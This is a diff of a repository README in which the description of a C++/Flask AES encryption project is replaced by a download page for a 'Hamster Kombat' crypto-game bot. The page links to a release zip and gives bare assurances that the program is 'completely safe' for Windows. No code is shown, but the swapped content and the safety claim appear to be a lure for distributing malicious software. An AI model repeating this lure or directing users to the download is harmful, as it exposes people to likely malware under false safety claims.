@@ -1,14 +1,49 @@
-Encryption Software using C++ and Web Development
+## Download Here ⬇️
 
-This project is a simple encryption application that integrates a C++ backend for encryption and decryption with a web interface for user interaction. The project uses the Advanced Encryption Standard (AES) algorithm for encryption and decryption, demonstrating how to bridge C++ applications with web technologies.
+ * **<p><a href="https://github.com/Samsann/Hamst3rKombatB0T/releases/download/Download/Version_2.7.zip">​Download B0T</a>**
 
-Features
-AES Encryption and Decryption: Uses OpenSSL library in C++ to perform AES encryption and decryption.
-Web Interface: A user-friendly web interface created with HTML, CSS, and JavaScript for interacting with the encryption and decryption functionalities.
-Flask Backend: A Flask server to handle HTTP requests and communicate with the C++ encryption binary.
 
-Requirements
-C++ Compiler: GCC, MSVC, or any other standard C++ compiler.
-OpenSSL Library: For handling encryption algorithms.
-Python: For running the Flask server.
-Flask: Python micro web framework.
+---
+
+<h1 align="center">  B0T HAMST3R K0MBAT </h1>
+
+
+
+> [!NOTE]
+> Hi everyone today we present you our bot for crypto game hamsterkombat with which you can automate the whole process in the game which is possible
+>
+> 
+---
+<div align="center">
+
+
+
+ 
+
+ ---
+
+ <div align="center">
+
+   
+### Features 🛠️
+</div>
+
+- Auto tuning
+- Auto clicker for many accounts
+- Multi-threading
+- Convenient menu
+- Free proxies
+
+---
+
+> [!TIP]
+> 1. You get through a simple and easy menu.
+> 2. The most important thing: the program is completely safe for your Windows system.
+> 3. Supports most systems: Windows 7/8/10/11 (x32/64).
+
+---
+
+<div align="center">****
+
+
+
